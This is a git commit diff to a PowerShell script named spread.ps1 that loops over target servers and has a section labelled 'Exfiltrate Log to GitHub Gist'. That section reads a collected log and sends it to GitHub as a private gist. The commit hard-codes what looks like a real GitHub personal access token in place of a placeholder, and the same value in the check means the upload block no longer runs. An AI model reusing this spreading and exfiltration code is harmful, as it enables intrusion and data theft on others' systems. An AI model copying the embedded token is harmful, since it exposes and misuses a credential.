0f5dc8ae649cc7387dc607060376b20cfe27b3d7
jimmysbestestfriend-source <jimmysbestestfriend@gmail.com>
2026-03-31 15:34:29 -0400

    Update spread.ps1

--- spread.ps1
+++ spread.ps1
@@ -52,8 +52,8 @@ foreach ($server in $targets) {
 }
 
 # 4. Exfiltrate Log to GitHub Gist
-$githubToken = "YOUR_TOKEN_HERE" # Replace with your PAT
-if ($githubToken -ne "YOUR_TOKEN_HERE") {
+$githubToken = "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" # Replace with your PAT
+if ($githubToken -ne "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") {
     Write-Host "Exfiltrating logs to GitHub..." -ForegroundColor Cyan
     $content = Get-Content $logPath -Raw
     $body = @{ description="Lab Enum"; public=$false; files=@{"enum.txt"=@{content=$content}}} | ConvertTo-Json
